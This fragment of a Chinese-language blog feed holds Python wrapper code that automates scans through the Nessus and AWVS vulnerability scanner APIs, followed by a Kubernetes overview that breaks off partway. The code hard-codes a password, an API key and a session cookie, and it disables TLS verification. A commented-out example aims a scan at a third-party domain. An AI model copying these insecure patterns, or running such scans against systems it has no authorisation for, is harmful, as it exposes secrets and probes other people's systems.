        <content type="html"><![CDATA[<p><img src="http://upload-images.jianshu.io/upload_images/3941016-beb5143ed978f26e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="nessus.jpg"></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 最近在做自动化安全扫描器开发，在项目中想引用比较知名的扫描器，如是整理了一下API作为参考</p><a id="more"></a><h1 id="Nessus-6-x版本"><a href="#Nessus-6-x版本" class="headerlink" title=" Nessus 6.x版本"></a><font color="#C71585" size="4" face="黑体"> Nessus 6.x版本</font></h1><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time    : 2017/8/21 下午4:08# @Author  : Yu BenLiu# @Site    : QVQ# @File    : nessus_api_6.py.py# @Software: PyCharmimport sys# sys.path.append(&quot;..&quot;)import requests, json, csv, os, timefrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)# from core.settings import talscan_config,redis_taskfrom host_type_check import *talscan_config = {&quot;report_filters&quot;: {    &quot;awvs_white_list&quot;: [&quot;orange&quot;, &quot;red&quot;, &quot;blue&quot;],  # green,blue,orange,red四种级别    &quot;nessus_white_list&quot;: [&quot;High&quot;, &quot;Medium&quot;, &quot;Low&quot;],    &quot;bug_black_list&quot;: [  # 漏洞黑名单，过滤掉一些危害等级高，但没什么卵用的洞        &quot;User credentials are sent in clear text&quot;    ]}}class Work(object):    def __init__(self, scan_id=&quot;&quot;, scan_uuid=&quot;&quot;,scan_target=&quot;&quot;, scan_type=&quot;&quot;, scan_args=&quot;&quot;, back_fn=None):        self.api_url = &#39;https://192.168.29.198:8834&#39;        self.username = &quot;root&quot;        self.password = &quot;ybl8651073&quot;        self.filter = talscan_config[&quot;report_filters&quot;]        self.report_save_dir = &#39;/tmp/&#39;        self.verify = False        self.token = &#39;&#39;        self.enable = True        self.scan_uuid=scan_uuid        self.scan_id = scan_id        self.target = scan_target        self.scan_type = scan_type        self.args = scan_args        self.back_fn = back_fn        self.result = {}    def connect(self, method, resource, data=None, params=None):        headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(self.token), &#39;content-type&#39;: &#39;application/json&#39;}        data = json.dumps(data)        try:            if method == &#39;POST&#39;:                r = requests.post(str(self.api_url + resource), data=data, headers=headers, verify=self.verify)            elif method == &#39;PUT&#39;:                r = requests.put(str(self.api_url + resource), data=data, headers=headers, verify=self.verify)            elif method == &#39;DELETE&#39;:                r = requests.delete(str(self.api_url + resource), data=data, headers=headers, verify=self.verify)            else:                r = requests.get(str(self.api_url + resource), params=params, headers=headers, verify=self.verify)        except Exception, e:            print  e            return {&quot;status&quot;: 3}        if r.status_code == 200:            try:                data = r.json()            except:                data = r.content            result = {&quot;status&quot;: 1, &quot;data&quot;: data}            return result        else:            result = {&quot;status&quot;: 3}            return result    def nessus_login(self):        login = {&#39;username&#39;: self.username, &#39;password&#39;: self.password}        data = self.connect(&#39;POST&#39;, &#39;/session&#39;, data=login)        print data        status = data[&quot;status&quot;]        print status        if status == 1:            result = {&quot;status&quot;: 1, &quot;data&quot;: data[&quot;data&quot;][&#39;token&#39;]}            print  result            return result        else:            result = {&quot;status&quot;: 0}            print result            return result    def nessus_process_status(self, sid):        # canceled,running,completed        data = self.nessus_login()        status = data[&quot;status&quot;]        if status == 1:            token = data[&quot;data&quot;]        else:            result = {&quot;status&quot;: 0}            return result        headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;}        url = self.api_url + &#39;/scans/&#39;        data = requests.get(url=url, params=None, headers=headers, verify=self.verify)        res = data.json()        info1=res[&#39;scans&#39;]        print info1        try:            return  info1        except:            return {&quot;status&quot;: 0}    def  nessus_policies(self,):        data = self.nessus_login()        status = data[&quot;status&quot;]        if status == 1:            token = data[&quot;data&quot;]        else:            result = {&quot;status&quot;: 0}            return result        headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;}        url = self.api_url + &#39;/policies/&#39;        data = requests.get(url=url, params=None, headers=headers, verify=self.verify)        res = data.json()        info=res[&#39;policies&#39;]        print info        try:            return info        except:            return {&quot;status&quot;: 0}    def nessus_add_task(self):        if is_domain(self.target) or is_host(self.target):            create_data = {                &quot;uuid&quot;: self.scan_uuid,                # &quot;uuid&quot;: &#39;ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66&#39;,#选择策略                &quot;settings&quot;: {                    &quot;name&quot;: self.scan_id,                    &quot;scanner_id&quot;: &quot;1&quot;,                    &quot;text_targets&quot;: self.target,                    &quot;enabled&quot;: False,                    &quot;launch_now&quot;: True,                }            }            post_data = json.dumps(create_data)            data = self.nessus_login()            status = data[&quot;status&quot;]            if status == 1:                token = data[&quot;data&quot;]            else:                print  &#39;99&#39;                return {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :登陆失败&quot;}            headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;}            r = requests.post(url=str(self.api_url + &#39;/scans&#39;), data=post_data, headers=headers, verify=self.verify)            if r.status_code == 200:                try:                    get_id = r.json()                except:                    get_id = r.content                sid = get_id[&#39;scan&#39;][&#39;id&#39;]                result = {&quot;status&quot;: 1, &quot;data&quot;: sid}                return result            else:                result = {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :增加任务失败&quot;}                return result        else:            return {&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :格式错误&quot;}    def nessus_stop_task(self, sid):        data = self.nessus_login()        status = data[&quot;status&quot;]        if status == 1:            token = data[&quot;data&quot;]        else:            result = {&quot;status&quot;: 0}            return result        headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;}        url = str(self.api_url + &#39;/scans/{0}/stop/&#39;.format(sid))        r = requests.post(url=url, params=None, headers=headers, verify=self.verify)        if r.status_code == 200:            result = {&quot;status&quot;: 1}            return result        else:            result = {&quot;status&quot;: 0}            return result    def nessus_report_task(self, taskid, sid):        bug_list = []        data = self.nessus_login()        status = data[&quot;status&quot;]        if status == 1:            token = data[&quot;data&quot;]        else:            result = {&quot;status&quot;: 0}            return result        headers = {&#39;X-Cookie&#39;: &#39;token={0}&#39;.format(token), &#39;content-type&#39;: &#39;application/json&#39;}        url = str(self.api_url + &#39;/scans/{0}/export&#39;.format(sid))        data = json.dumps({&quot;format&quot;: &quot;csv&quot;})        r = requests.post(url=url, data=data, headers=headers, verify=self.verify)        try:            file = r.json()[&#39;token&#39;]        except:            result = {&quot;status&quot;: 0}            return result        down_file_url = str(self.api_url + &#39;/scans/exports/{0}/download&#39;.format(file))        r = requests.get(url=down_file_url, headers=headers, verify=self.verify)        csv_file = str(self.report_save_dir + &quot;{0}_nessus.csv&quot;.format(str(taskid)))        f = open(csv_file, &#39;wb&#39;)        data = r.content        f.write(data)        f.close()        csv_open_file = open(csv_file, &#39;rb&#39;)        csvReader = csv.reader(csv_open_file)        for row in csvReader:            parameterStr = &#39;,&#39;.join(row)            parameters = parameterStr.split(&#39;,&#39;)            PID = parameters[0]            CVE = parameters[1]            CVSS = parameters[2]            Risk = parameters[3]            Host = parameters[4]            Protocol = parameters[5]            Port = parameters[6]            Name = parameters[7]            Synopsis = parameters[8]            Description = parameters[9]            Solution = parameters[10]            See_Also = parameters[11]            Plugin_Output = parameters[12]            bug_name = str(Name)            bug_level = str(Risk)            bug_summary = str(Synopsis) + &quot;\r\n&quot; + str(Description)            bug_detail = &quot;Bug Port : &quot; + str(Port) + &quot;\r\n&quot; + &quot;CVE : &quot; + str(CVE)            bug_repair = str(Solution) + &quot;\r\n&quot; + str(Plugin_Output)            if str(Risk) in self.filter[&#39;nessus_white_list&#39;]:                bug_list.append(                    {&#39;bug_name&#39;: bug_name, &#39;bug_level&#39;: bug_level, &#39;bug_summary&#39;: bug_summary, &#39;bug_detail&#39;: bug_detail,                     &#39;bug_repair&#39;: bug_repair})        csv_open_file.close()        # os.remove(csv_file)        if len(bug_list) &gt; 0:            result = {&quot;status&quot;: 1, &quot;data&quot;: bug_list}            return bug_list        else:            result = {&quot;status&quot;: 0}            return result    def run(self):        result = self.nessus_add_task()        status = result[&quot;status&quot;]        if status == 1:            nessus_id = int(result[&quot;data&quot;])            while True:                time.sleep(5)                nessus_process = self.nessus_process_status(nessus_id)                nessus_status = nessus_process[&quot;status&quot;]                if nessus_status == 1:                    nessus_process_data = nessus_process[&quot;data&quot;].encode(&quot;utf8&quot;)                    if nessus_process_data == &quot;completed&quot;:                        break            time.sleep(20)  # 推迟20秒，获取报告;nessus任务进程到100有部分延迟结束时间            nessus_report = self.nessus_report_task(self.scan_id, nessus_id)            nessus_report_status = nessus_report[&quot;status&quot;]            if nessus_report_status == 1:                nessus_report_data = nessus_report[&quot;data&quot;]                data = []                for line in nessus_report_data:                    task_result = {                        &quot;scan_id&quot;: self.scan_id,                        &quot;model&quot;: &quot;nessus&quot;,                        &quot;bug_author&quot;: &quot;bing&quot;,                        &quot;bug_name&quot;: line[&quot;bug_name&quot;],                        &quot;bug_level&quot;: line[&quot;bug_level&quot;],                        &quot;bug_summary&quot;: line[&quot;bug_summary&quot;],                        &quot;bug_detail&quot;: line[&quot;bug_detail&quot;],                        &quot;bug_repair&quot;: line[&quot;bug_repair&quot;]                    }                    redis_task.sadd(&quot;nessus_result&quot;, task_result)                    print task_result                # 任务最终结束                final_result = {&quot;status&quot;: 1, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;}                redis_task.sadd(&quot;nessus_result&quot;, final_result)                print final_result            else:                # 任务最终结束                final_result = {&quot;status&quot;: 1, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;}                redis_task.sadd(&quot;nessus_result&quot;, final_result)                print final_result        elif status == 2:            nessus_error = result[&quot;data&quot;]            final_result = {&quot;status&quot;: 2, &quot;data&quot;: nessus_error, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;}            redis_task.sadd(&quot;nessus_result&quot;, final_result)            print final_result#t = Work(&quot;1234455&quot;,&quot;ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66&quot;,&quot;www.baidu.com&quot;)#s = t.nessus_report_task(5,84)#print s</code></pre><h1 id="Awvs-最新的api"><a href="#Awvs-最新的api" class="headerlink" title=" Awvs 最新的api"></a><font color="#C71585" size="4" face="黑体"> Awvs 最新的api</font></h1><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time    : 2017/8/22 下午3:08# @Author  : Yu BenLiu# @Site    : QVQ# @File    : awvs_api_11.py.py# @Software: PyCharmimport jsonimport requestsimport requests.packages.urllib3&#39;&#39;&#39;import requests.packages.urllib3.util.ssl_requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = &#39;ALL&#39;orpip install requests[security]&#39;&#39;&#39;requests.packages.urllib3.disable_warnings()tarurl = &quot;https://192.168.29.207:3443/&quot;apikey = &quot;1986ad8c0a5b3df4d7028d5f3c06e936c38438d15a1fb4f4588e034d3c3490fef&quot;headers = {&quot;X-Auth&quot;: apikey, &quot;content-type&quot;: &quot;application/json&quot;}def addtask(url=&#39;&#39;):    # 添加任务    data = {&quot;address&quot;: url, &quot;description&quot;: url, &quot;criticality&quot;: &quot;10&quot;}    try:        response = requests.post(tarurl + &quot;/api/v1/targets&quot;, data=json.dumps(data), headers=headers, timeout=30,                                 verify=False)        result = json.loads(response.content)        return result[&#39;target_id&#39;]    except Exception as e:        print(str(e))        returndef startscan(url):    # 先获取全部的任务.避免重复    # 添加任务获取target_id    # 开始扫描    &#39;&#39;&#39;    11111111-1111-1111-1111-111111111112    High Risk Vulnerabilities    11111111-1111-1111-1111-111111111115    Weak Passwords    11111111-1111-1111-1111-111111111117    Crawl Only    11111111-1111-1111-1111-111111111116    Cross-site Scripting Vulnerabilities    11111111-1111-1111-1111-111111111113    SQL Injection Vulnerabilities    11111111-1111-1111-1111-111111111118    quick_profile_2 0   {&quot;wvs&quot;: {&quot;profile&quot;: &quot;continuous_quick&quot;}}    11111111-1111-1111-1111-111111111114    quick_profile_1 0   {&quot;wvs&quot;: {&quot;profile&quot;: &quot;continuous_full&quot;}}    11111111-1111-1111-1111-111111111111    Full Scan   1   {&quot;wvs&quot;: {&quot;profile&quot;: &quot;Default&quot;}}    &#39;&#39;&#39;    targets = getscan()    if url in targets:        return &quot;repeat&quot;    else:        target_id = addtask(url)        data = {&quot;target_id&quot;: target_id, &quot;profile_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;,                &quot;schedule&quot;: {&quot;disable&quot;: False, &quot;start_date&quot;: None, &quot;time_sensitive&quot;: False}}        try:            response = requests.post(tarurl + &quot;/api/v1/scans&quot;, data=json.dumps(data), headers=headers, timeout=30,                                     verify=False)            result = json.loads(response.content)            return result[&#39;target_id&#39;]        except Exception as e:            print(str(e))            returndef getstatus(scan_id):    # 获取scan_id的扫描状况    try:        response = requests.get(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id), headers=headers, timeout=30, verify=False)        result = json.loads(response.content)        status = result[&#39;current_session&#39;][&#39;status&#39;]        # 如果是completed 表示结束.可以生成报告        if status == &quot;completed&quot;:            return getreports(scan_id)        else:            return result[&#39;current_session&#39;][&#39;status&#39;]    except Exception as e:        print(str(e))        returndef delete_scan(scan_id):    # 删除scan_id的扫描    try:        response = requests.delete(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id), headers=headers, timeout=30, verify=False)        # 如果是204 表示删除成功        if response.status_code == &quot;204&quot;:            return True        else:            return False    except Exception as e:        print(str(e))        returndef delete_target(scan_id):    # 删除scan_id的扫描    try:        response = requests.delete(tarurl + &quot;/api/v1/targets/&quot; + str(scan_id), headers=headers, timeout=30,                                   verify=False)        # 如果是204 表示删除成功        if response.status_code == &quot;204&quot;:            return True        else:            return False    except Exception as e:        print(str(e))        returndef stop_scan(scan_id):    # 停止scan_id的扫描    try:        response = requests.post(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id + &quot;/abort&quot;), headers=headers, timeout=30,                                 verify=False)        # 如果是204 表示停止成功        if response.status_code == &quot;204&quot;:            return True        else:            return False    except Exception as e:        print(str(e))        returndef scan_status():    # 停止scan_id的扫描    try:        response = requests.get(tarurl + &quot;/api/v1/me/stats&quot;, headers=headers, timeout=30, verify=False)        result = json.loads(response.content)        print result        return result    except Exception as e:        print(str(e))        returndef getreports(scan_id):    # 获取scan_id的扫描报告    &#39;&#39;&#39;    11111111-1111-1111-1111-111111111111    Developer    21111111-1111-1111-1111-111111111111    XML    11111111-1111-1111-1111-111111111119    OWASP Top 10 2013    11111111-1111-1111-1111-111111111112    Quick    &#39;&#39;&#39;    data = {&quot;template_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;,            &quot;source&quot;: {&quot;list_type&quot;: &quot;scans&quot;, &quot;id_list&quot;: [scan_id]}}    try:        response = requests.post(tarurl + &quot;/api/v1/reports&quot;, data=json.dumps(data), headers=headers, timeout=30,                                 verify=False)        result = response.headers        report = result[&#39;Location&#39;].replace(&#39;/api/v1/reports/&#39;, &#39;/reports/download/&#39;)        return tarurl.rstrip(&#39;/&#39;) + report    except Exception as e:        print(str(e))        return    finally:        delete_scan(scan_id)def config(url):    target_id = addtask(url)    # 获取全部的扫描状态    data = {        &quot;excluded_paths&quot;: [&quot;manager&quot;, &quot;phpmyadmin&quot;, &quot;testphp&quot;],        &quot;user_agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36&quot;,        &quot;custom_headers&quot;: [&quot;Accept: */*&quot;, &quot;Referer:&quot; + url, &quot;Connection: Keep-alive&quot;],        &quot;custom_cookies&quot;: [{&quot;url&quot;: url,                            &quot;cookie&quot;: &quot;UM_distinctid=15da1bb9287f05-022f43184eb5d5-30667808-fa000-15da1bb9288ba9; PHPSESSID=dj9vq5fso96hpbgkdd7ok9gc83&quot;}],        &quot;scan_speed&quot;: &quot;moderate&quot;,  # sequential/slow/moderate/fast more and more fast        &quot;technologies&quot;: [&quot;PHP&quot;],  # ASP,ASP.NET,PHP,Perl,Java/J2EE,ColdFusion/Jrun,Python,Rails,FrontPage,Node.js        # 代理        &quot;proxy&quot;: {            &quot;enabled&quot;: False,            &quot;address&quot;: &quot;127.0.0.1&quot;,            &quot;protocol&quot;: &quot;http&quot;,            &quot;port&quot;: 8080,            &quot;username&quot;: &quot;aaa&quot;,            &quot;password&quot;: &quot;bbb&quot;        },        # 无验证码登录        &quot;login&quot;: {            &quot;kind&quot;: &quot;automatic&quot;,            &quot;credentials&quot;: {                &quot;enabled&quot;: False,                &quot;username&quot;: &quot;test&quot;,                &quot;password&quot;: &quot;test&quot;            }        },        # 401认证        &quot;authentication&quot;: {            &quot;enabled&quot;: False,            &quot;username&quot;: &quot;test&quot;,            &quot;password&quot;: &quot;test&quot;        }    }    try:        res = requests.patch(tarurl + &quot;/api/v1/targets/&quot; + str(target_id) + &quot;/configuration&quot;, data=json.dumps(data),                             headers=headers, timeout=30 * 4, verify=False)        data = {&quot;target_id&quot;: target_id, &quot;profile_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;,                &quot;schedule&quot;: {&quot;disable&quot;: False, &quot;start_date&quot;: None, &quot;time_sensitive&quot;: False}}        try:            response = requests.post(tarurl + &quot;/api/v1/scans&quot;, data=json.dumps(data), headers=headers, timeout=30,                                     verify=False)            result = json.loads(response.content)            return result[&#39;target_id&#39;]        except Exception as e:            print(str(e))            return    except Exception as e:        raise edef getvulnerabilities():    # 停止scan_id的扫描    try:        response = requests.get(tarurl + &quot;/api/v1/vulnerabilities&quot;, headers=headers, timeout=30, verify=False)        result = json.loads(response.content)        print result        return result    except Exception as e:        print(str(e))        returndef getscan():    # 获取全部的扫描状态    targets = []    try:        response = requests.get(tarurl + &quot;/api/v1/scans&quot;, headers=headers, timeout=30, verify=False)        results = json.loads(response.content)        return results    except Exception as e:        raise edef getvulnerabilitiesinfo(sid):    # 停止scan_id的扫描    try:        response = requests.get(tarurl + &quot;/api/v1/vulnerabilities/&quot;+sid, headers=headers, timeout=30, verify=False)        result = json.loads(response.content)        print result        return result    except Exception as e:        print(str(e))        returnif __name__ == &#39;__main__&#39;:    info=getscan()    print info    print type(info)    #print getreports(&#39;f22d4aa1-e2de-4307-bd9d-ddf3aa531bc1&#39;,locals())   # print config(&#39;http://testhtml5.vulnweb.com/&#39;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏扫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 扫描器 </tag>
            
            <tag> 工具 </tag>
            
            <tag> 自动化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kubernetes的部署</title>
      <link href="/2019/08/01/kubernetes%E7%9A%84%E9%83%A8%E7%BD%B2/"/>
      <url>/2019/08/01/kubernetes%E7%9A%84%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是kubernetes"><a href="#什么是kubernetes" class="headerlink" title="什么是kubernetes"></a>什么是kubernetes</h2><blockquote><p>Kubernetes是Google开源的容器集群管理系统，其提供应用部署、维护、 扩展机制等功能，利用Kubernetes能方便地管理跨机器运行容器化的应用</p></blockquote><a id="more"></a>   <p>##主要的功能<br>1) 使用Docker对应用程序包装(package)、实例化(instantiate)、运行(run)。</p><p>2) 以集群的方式运行、管理跨机器的容器。</p><p>3) 解决Docker跨机器容器之间的通讯问题。</p><p>4) Kubernetes的自我修复机制使得容器集群总是运行在用户期望的状态。</p><h2 id="Kubernetes主要概念"><a href="#Kubernetes主要概念" class="headerlink" title="Kubernetes主要概念"></a>Kubernetes主要概念</h2><h3 id="一-Pods"><a href="#一-Pods" class="headerlink" title="一 Pods"></a>一 Pods</h3><p>Pod是Kubernetes的基本操作单元，把相关的一个或多个容器构成一个Pod，通常Pod里的容器运行相同的应用。Pod包含的容器运行在同一个Minion(Host)上，看作一个统一管理单元，共享相同的volumes和network namespace/IP和Port空间。</p><h3 id="二-Services"><a href="#二-Services" class="headerlink" title="二 Services"></a>二 Services</h3><p>Services也是Kubernetes的基本操作单元，是真实应用服务的抽象，每一个服务后面都有很多对应的容器来支持，通过Proxy的port和服务selector决定服务请求传递给后端提供服务的容器，对外表现为一个单一访问接口，外部不需要了解后端如何运行，这给扩展或维护后端带来很大的好处。</p><h3 id="三-Replication-Controllers"><a href="#三-Replication-Controllers" class="headerlink" title="三 Replication Controllers"></a>三 Replication Controllers</h3><p>Replication Controller确保任何时候Kubernetes集群中有指定数量的pod副本(replicas)在运行， 如果少于指定数量的pod副本(replicas)，Replication Controller会启动新的Container，反之会杀死多余的以保证数量不变。Replication Controller使用预先定义的pod模板创建pods，一旦创建成功，pod 模板和创建的pods没有任何关联，可以修改pod 模板而不会对已创建pods有任何影响，也可以直接更新通过Replication Controller创建的pods。对于利用pod 模板创建的pods，Replication Controller根据label selector来关联，通过修改pods的label可以删除对应的pods。Replication Controller主要有如下用法：<br>1) Rescheduling<br>如上所述，Replication Controller会确保Kubernetes集群中指定的pod副本(replicas)在运行， 即使在节点出错时。<br>2) Scaling<br>通过修改Replication Controller的副本(replicas)数量来水平扩展或者缩小运行的pods。<br>3) Rolling updates<br>Replication Controller的设计原则使得可以一个一个地替换pods来rolling updates服务。<br>4) Multiple release tracks<br>如果需要在系统中运行multiple release的服务，Replication Controller使用labels来区分multiple release tracks。</p><h3 id="四-Labels"><a href="#四-Labels" class="headerlink" title="四 Labels"></a>四 Labels</h3><p>Labels是用于区分Pod、Service、Replication Controller的key/value键值对，Pod、Service、 Replication Controller可以有多个label，但是每个label的key只能对应一个value。Labels是Service和Replication Controller运行的基础，为了将访问Service的请求转发给后端提供服务的多个容器，正是通过标识容器的labels来选择正确的容器。同样，Replication Controller也使用labels来管理通过pod 模板创建的一组容器，这样Replication Controller可以更加容易，方便地管理多个容器，无论有多少容器。</p><h2 id="Kubernetes构件"><a href="#Kubernetes构件" class="headerlink" title="Kubernetes构件"></a>Kubernetes构件</h2><p>Kubenetes整体框架，主要包括kubecfg、Master API Server、Kubelet、Minion(Host)以及Proxy</p><p><img src="http://upload-images.jianshu.io/upload_images/3941016-76ea037267e3e5b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="一-Master"><a href="#一-Master" class="headerlink" title="一  Master"></a>一  Master</h3><p>Master定义了Kubernetes 集群Master/API Server的主要声明，包括Pod Registry、Controller Registry、Service Registry、Endpoint Registry、Minion Registry、Binding Registry、RESTStorage以及Client, 是client(Kubecfg)调用Kubernetes API，管理Kubernetes主要构件Pods、Services、Minions、容器的入口。Master由API Server、Scheduler以及Registry等组成。从下图可知Master的工作流主要分以下步骤：<br>1) Kubecfg将特定的请求，比如创建Pod，发送给Kubernetes Client。<br>2) Kubernetes Client将请求发送给API server。<br>3) API Server根据请求的类型，比如创建Pod时storage类型是pods，然后依此选择何种REST Storage API对请求作出处理。<br>4) REST Storage API对的请求作相应的处理。<br>5) 将处理的结果存入高可用键值存储系统Etcd中。<br>6) 在API Server响应Kubecfg的请求后，Scheduler会根据Kubernetes Client获取集群中运行Pod及Minion信息。<br>7) 依据从Kubernetes Client获取的信息，Scheduler将未分发的Pod分发到可用的Minion节点上。<br>下面是Master的主要构件的详细介绍：<br><img src="http://upload-images.jianshu.io/upload_images/3941016-16f56503372f2b4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>图3-2 Master主要构件及工作流</p><h3 id="Minion-Registry"><a href="#Minion-Registry" class="headerlink" title="Minion Registry"></a>Minion Registry</h3><p>Minion Registry负责跟踪Kubernetes 集群中有多少Minion(Host)。Kubernetes封装Minion Registry成实现Kubernetes API Server的RESTful API接口REST，通过这些API，我们可以对Minion Registry做Create、Get、List、Delete操作，由于Minon只能被创建或删除，所以不支持Update操作，并把Minion的相关配置信息存储到etcd。除此之外，Scheduler算法根据Minion的资源容量来确定是否将新建Pod分发到该Minion节点。</p><h3 id="Pod-Registry"><a href="#Pod-Registry" class="headerlink" title="Pod Registry"></a>Pod Registry</h3><p>Pod Registry负责跟踪Kubernetes集群中有多少Pod在运行，以及这些Pod跟Minion是如何的映射关系。将Pod Registry和Cloud Provider信息及其他相关信息封装成实现Kubernetes API Server的RESTful API接口REST。通过这些API，我们可以对Pod进行Create、Get、List、Update、Delete操作，并将Pod的信息存储到etcd中，而且可以通过Watch接口监视Pod的变化情况，比如一个Pod被新建、删除或者更新。</p><h3 id="Service-Registry"><a href="#Service-Registry" class="headerlink" title="Service Registry"></a>Service Registry</h3><p>Service Registry负责跟踪Kubernetes集群中运行的所有服务。根据提供的Cloud Provider及Minion Registry信息把Service Registry封装成实现Kubernetes API Server需要的RESTful API接口REST。利用这些接口，我们可以对Service进行Create、Get、List、Update、Delete操作，以及监视Service变化情况的watch操作，并把Service信息存储到etcd。</p><h3 id="Controller-Registry"><a href="#Controller-Registry" class="headerlink" title="Controller Registry"></a>Controller Registry</h3><p>Controller Registry负责跟踪Kubernetes集群中所有的Replication Controller，Replication Controller维护着指定数量的pod 副本(replicas)拷贝，如果其中的一个容器死掉，Replication Controller会自动启动一个新的容器，如果死掉的容器恢复，其会杀死多出的容器以保证指定的拷贝不变。通过封装Controller Registry为实现Kubernetes API Server的RESTful API接口REST， 利用这些接口，我们可以对Replication Controller进行Create、Get、List、Update、Delete操作，以及监视Replication Controller变化情况的watch操作，并把Replication Controller信息存储到etcd。</p><h3 id="Endpoints-Registry"><a href="#Endpoints-Registry" class="headerlink" title="Endpoints Registry"></a>Endpoints Registry</h3><p>Endpoints Registry负责收集Service的endpoint，比如Name：”mysql”，Endpoints: [“10.10.1.1:1909”，”10.10.2.2:8834”]，同Pod Registry，Controller Registry也实现了Kubernetes API Server的RESTful API接口，可以做Create、Get、List、Update、Delete以及watch操作。</p><h3 id="Binding-Registry"><a href="#Binding-Registry" class="headerlink" title="Binding Registry"></a>Binding Registry</h3><p>Binding包括一个需要绑定Pod的ID和Pod被绑定的Host，Scheduler写Binding Registry后，需绑定的Pod被绑定到一个host。Binding Registry也实现了Kubernetes API Server的RESTful API接口，但Binding Registry是一个write-only对象，所有只有Create操作可以使用， 否则会引起错误。</p><h3 id="Scheduler"><a href="#Scheduler" class="headerlink" title="Scheduler"></a>Scheduler</h3><p>Scheduler收集和分析当前Kubernetes集群中所有Minion节点的资源(内存、CPU)负载情况，然后依此分发新建的Pod到Kubernetes集群中可用的节点。由于一旦Minion节点的资源被分配给Pod，那这些资源就不能再分配给其他Pod， 除非这些Pod被删除或者退出， 因此，Kubernetes需要分析集群中所有Minion的资源使用情况，保证分发的工作负载不会超出当前该Minion节点的可用资源范围。具体来说，Scheduler做以下工作：<br>1) 实时监测Kubernetes集群中未分发的Pod。<br>2) 实时监测Kubernetes集群中所有运行的Pod，Scheduler需要根据这些Pod的资源状况安全地将未分发的Pod分发到指定的Minion节点上。<br>3) Scheduler也监测Minion节点信息，由于会频繁查找Minion节点，Scheduler会缓存一份最新的信息在本地。<br>4) 最后，Scheduler在分发Pod到指定的Minion节点后，会把Pod相关的信息Binding写回API Server。</p><h3 id="Kubelet"><a href="#Kubelet" class="headerlink" title="Kubelet"></a>Kubelet</h3><p><img src="http://upload-images.jianshu.io/upload_images/3941016-470b89f752a0b96d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>图3-3 Kubernetes详细构件<br>根据上图3-3可知Kubelet是Kubernetes集群中每个Minion和Master API Server的连接点，Kubelet运行在每个Minion上，是Master API Server和Minion之间的桥梁，接收Master API Server分配给它的commands和work，与持久性键值存储etcd、file、server和http进行交互，读取配置信息。Kubelet的主要工作是管理Pod和容器的生命周期，其包括Docker Client、Root Directory、Pod Workers、Etcd Client、Cadvisor Client以及Health Checker组件，具体工作如下：<br>1) 通过Worker给Pod异步运行特定的Action。<br>2) 设置容器的环境变量。<br>3) 给容器绑定Volume。<br>4) 给容器绑定Port。<br>5) 根据指定的Pod运行一个单一容器。<br>6) 杀死容器。<br>7) 给指定的Pod创建network 容器。<br>8) 删除Pod的所有容器。<br>9) 同步Pod的状态。<br>10) 从Cadvisor获取container info、 pod info、root info、machine info。<br>11) 检测Pod的容器健康状态信息。<br>12) 在容器中运行命令。</p><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><p>Proxy是为了解决外部网络能够访问跨机器集群中容器提供的应用服务而设计的，从上图3-3可知Proxy服务也运行在每个Minion上。Proxy提供TCP/UDP sockets的proxy，每创建一种Service，Proxy主要从etcd获取Services和Endpoints的配置信息，或者也可以从file获取，然后根据配置信息在Minion上启动一个Proxy的进程并监听相应的服务端口，当外部请求发生时，Proxy会根据Load Balancer将请求分发到后端正确的容器处</p><h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><blockquote><p>准备工作</p></blockquote><table><thead><tr><th>对象</th><th>版本</th><th>ip</th><th>备注</th></tr></thead><tbody><tr><td>k8s-master</td><td>centos7</td><td>192.168.29.11</td><td>K8S的master所在主机</td></tr><tr><td>etcd-server</td><td>centos7</td><td>192.168.29.11</td><td>etcd服务所在主机，与master在同一机器</td></tr><tr><td>k8s-slave</td><td>centos7</td><td>192.168.29.12</td><td>K8S节点所在主机</td></tr></tbody></table><h3 id="安装主要程序"><a href="#安装主要程序" class="headerlink" 